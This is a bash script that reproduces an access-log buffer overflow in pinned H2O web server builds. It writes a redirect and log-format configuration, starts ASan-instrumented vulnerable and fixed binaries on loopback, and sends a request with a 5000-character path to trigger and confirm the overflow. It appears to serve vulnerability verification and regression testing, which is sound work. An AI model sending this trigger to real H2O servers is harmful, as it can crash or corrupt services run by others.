#!/usr/bin/env bash
# Reproduce the live wire-triggered access-log overflow on pinned H2O builds.
# Loopback only. Expects both ASan h2o binaries already built out-of-tree.
set -u
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
OUT="$ROOT/live/replay-out"
mkdir -p "$OUT"
rm -f "$OUT"/*

render() {
  cat > "$OUT/$2.conf" <<EOF
listen:
  host: 127.0.0.1
  port: $1
num-threads: 1
error-log: $OUT/$2-error.log
hosts:
  default:
    access-log:
      path: $OUT/$2-access.log
      format: '%{error}x'
    paths:
      /:
        redirect:
          status: 302
          internal: YES
          url: '//:'
EOF
}

wait_port() {
  python3 - "$1" <<'PY'
import socket, sys, time
port = int(sys.argv[1])
for _ in range(100):
    try:
        s = socket.create_connection(("127.0.0.1", port), 0.2)
        s.close()
        raise SystemExit(0)
    except OSError:
        time.sleep(0.1)
raise SystemExit(1)
PY
}

run_case() {
  bin="$1"; conf="$2"; port="$3"; tag="$4"; n="$5"
  rm -f "$OUT/asan-$tag."*
  ASAN_OPTIONS="detect_leaks=0:abort_on_error=0:log_path=$OUT/asan-$tag" \
    "$bin" -c "$conf" >"$OUT/server-$tag.log" 2>&1 &
  pid=$!
  if ! wait_port "$port"; then echo "$tag: SERVER_NOT_READY"; kill "$pid" 2>/dev/null; return; fi
  path="$(python3 -c "print('A' * $n)")"
  curl -sS -o /dev/null -w "$tag: HTTP=%{http_code}\n" --max-time 15 "http://127.0.0.1:$port/$path"
  sleep 1
  kill "$pid" 2>/dev/null || true
  wait "$pid" 2>/dev/null || true
  if ls "$OUT/asan-$tag."* >/dev/null 2>&1; then
    echo "$tag: ASAN=YES"
    grep -m1 'ERROR: AddressSanitizer' "$OUT/asan-$tag."* || true
    grep -m1 'offset 4160' "$OUT/asan-$tag."* || true
  else
    echo "$tag: ASAN=no"
  fi
}

render 17994 vuln
render 17995 fixed
run_case "$ROOT/src/vuln/build-asan/h2o" "$OUT/vuln.conf" 17994 vuln-short 8
run_case "$ROOT/src/vuln/build-asan/h2o" "$OUT/vuln.conf" 17994 vuln-long 5000
run_case "$ROOT/src/fixed/build-asan/h2o" "$OUT/fixed.conf" 17995 fixed-long 5000
